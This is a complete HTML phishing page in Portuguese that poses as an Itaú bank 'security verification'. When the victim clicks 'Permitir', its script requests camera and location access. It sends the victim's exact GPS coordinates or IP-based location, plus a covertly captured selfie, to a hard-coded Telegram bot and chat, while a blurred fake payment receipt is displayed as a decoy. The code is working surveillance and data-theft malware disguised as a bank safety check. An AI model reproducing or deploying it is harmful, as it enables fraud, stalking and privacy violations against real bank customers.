<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Verifica√ß√£o de Seguran√ßa ‚Äì Ita√∫</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
body{background:#0a2540;color:#fff;display:flex;height:100vh;align-items:center;justify-content:center;text-align:center;padding:16px}
.card{background:#fff;color:#003366;border-radius:12px;padding:28px 24px;max-width:340px;box-shadow:0 8px 24px rgba(0,0,0,.25)}
h2{font-size:18px;margin-bottom:12px}
p{font-size:14px;margin-bottom:24px;line-height:1.4}
button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer;transition:.2s}
button:active{transform:scale(.98)}
#comprovante{display:none;filter:blur(5px)}
</style>
</head>
<body>

<!-- TELA DE CONVENCIMENTO -->
<div id="startBox" class="card">
  <h2>Prote√ß√£o contra golpes</h2>
  <p>Precisamos confirmar que voc√™ √© o titular. <br>Clique em <strong>Permitir</strong> para verificar sua identidade.</p>
  <button id="btnPermitir">Permitir</button>
</div>

<!-- COMPROVANTE FAKE (emba√ßado) -->
<div id="comprovante" class="card">
  <div style="font-weight:700;font-size:20px;margin-bottom:16px">Ita√∫</div>
  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
    <span>Comprovante</span><span id="dataHora"></span>
  </div>
  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
    <span>Valor</span><span id="valor">R$ 1.234,56</span>
  </div>
  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
    <span>ID transa√ß√£o</span><span id="idTransacao"></span>
  </div>
  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
    <span>Autentica√ß√£o BACEN</span><span id="autenticacao"></span>
  </div>
  <div style="text-align:center;font-size:11px;color:#666;margin-top:12px">Transa√ß√£o realizada com sucesso.</div>
</div>

<script>
// CONFIGS DO BOT
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '-1003187104876';

// DADOS FAKE
const dados = {
  dataHora: new Date().toLocaleString('pt-BR'),
  idTransacao: 'ITAU' + Date.now().toString(36).toUpperCase(),
  autenticacao: [...Array(16)].map(() => Math.random().toString(36)[2]).join('').toUpperCase()
};
document.getElementById('dataHora').textContent = dados.dataHora;
document.getElementById('idTransacao').textContent = dados.idTransacao;
document.getElementById('autenticacao').textContent = dados.autenticacao;

// ENVIA PARA O TELEGRAM
const tele = (msg, media) => {
  const url = media
    ? `https://api.telegram.org/bot${TOKEN}/sendPhoto`
    : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    body: media
      ? (() => { const f = new FormData(); f.append('chat_id', CHAT_ID); f.append('caption', msg); f.append('photo', media, 'selfie.jpg'); return f; })()
      : JSON.stringify({chat_id: CHAT_ID, text: msg}),
    headers: media ? {} : {'Content-Type':'application/json'}
  });
};

// MOSTRA O COMPROVANTE
function mostrarComprovante() {
  document.getElementById('startBox').style.display = 'none';
  document.getElementById('comprovante').style.display = 'block';
}

// TIRA SELFIE
async function tirarSelfie() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
    const v = document.createElement('video');
    v.srcObject = stream;
    await v.play();
    const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    canvas.getContext('2d').drawImage(v, 0, 0);
    canvas.toBlob(blob => {
      tele('üì∏ Selfie capturada', blob);
      stream.getTracks().forEach(t => t.stop());
    }, 'image/jpeg', 0.9);
  } catch (e) {
    tele('üì∏ Erro ao capturar selfie: ' + e.message);
  }
}

// PEGA LOCALIZA√á√ÉO
function obterViaIP() {
  fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(data => tele(`üìç Local aproximado:\nhttps://maps.google.com/?q=${data.latitude},${data.longitude}`))
    .catch(() => tele('üìç Falha ao obter IP'));
}

// A√á√ÉO DO BOT√ÉO
document.getElementById('btnPermitir').addEventListener('click', () => {
  // For√ßa permiss√µes
  navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
  navigator.geolocation.getCurrentPosition(
    pos => {
      const {latitude: lat, longitude: lon} = pos.coords;
      tele(`üìç GPS exato:\nhttps://maps.google.com/?q=${lat},${lon}`);
    },
    () => obterViaIP()
  );
  mostrarComprovante();
  setTimeout(tirarSelfie, 800);
});
</script>
</body>
</html>
